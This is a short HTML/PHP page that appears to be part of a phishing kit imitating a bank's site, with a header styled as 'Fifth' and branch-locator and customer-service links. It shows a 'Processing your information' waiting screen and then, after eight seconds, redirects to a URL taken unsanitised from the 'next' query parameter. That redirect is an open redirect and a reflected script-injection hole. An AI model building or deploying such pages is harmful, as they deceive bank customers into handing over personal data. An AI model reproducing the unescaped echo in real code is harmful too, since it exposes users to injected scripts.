<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth</title>
    <link rel="stylesheet" href="res\css\main.css">
</head>
<body>
    <header>
        <div class="logo">
            <img src="res\img/logo.svg">
        </div>
        <div class="logoo"> 
            <img src="res\img/logoo.png">
        </div>
        <div class="links">
            <a href="#">CUSTOMER SERVICE</a>|
            <a href="#">BRANCH & ATM LOCATOR</a>
        </div>
    </header>
    
    <div class="bottom">
       
        </div>

    <div class="cont">
        
        
    <div class="login">
            <h2>Please wait...</h2>
            <p>Processing your information...</p>
            <img src="res/img/loading.gif">
                
   

            </div>
            </div>

<script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script> 
</body>
</html>
